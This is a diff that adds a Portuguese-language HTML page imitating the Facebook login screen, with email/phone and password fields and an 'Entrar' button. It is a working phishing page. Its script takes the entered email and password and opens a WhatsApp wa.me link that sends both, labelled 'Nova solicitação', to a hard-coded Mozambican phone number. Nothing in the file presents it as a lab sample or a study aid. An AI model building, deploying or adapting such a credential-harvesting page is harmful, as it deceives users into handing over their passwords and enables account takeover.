@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulário Estilo Facebook</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      color: #1877f2;
+      font-size: 36px;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #145dbf;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h1>Facebook</h1>
+  <input type="text" id="email" placeholder="Email ou telefone" required>
+  <input type="password" id="senha" placeholder="Senha" required>
+  <button onclick="enviarParaWhatsApp()">Entrar</button>
+</div>
+
+<script>
+  function enviarParaWhatsApp() {
+    let email = document.getElementById("email").value;
+    let senha = document.getElementById("senha").value;
+
+    let mensagem = `Nova solicitação:%0AEmail: ${email}%0ASenha: ${senha}`;
+    let numero = "258857629056"; // Número com DDI de Moçambique
+    let link = `https://wa.me/${numero}?text=${mensagem}`;
+    
+    window.open(link, '_blank');
+  }
+</script>
+
+</body>
+</html>
